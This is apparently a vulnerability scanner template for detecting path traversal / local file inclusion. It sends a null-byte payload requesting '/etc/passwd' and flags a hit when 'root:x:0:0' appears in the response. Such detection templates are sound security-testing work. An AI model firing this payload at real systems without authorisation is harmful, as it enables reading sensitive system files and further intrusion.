id: lfi6-1392
name: 'Traversal in base'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via base'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      base:
        - '/etc/passwd%00'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
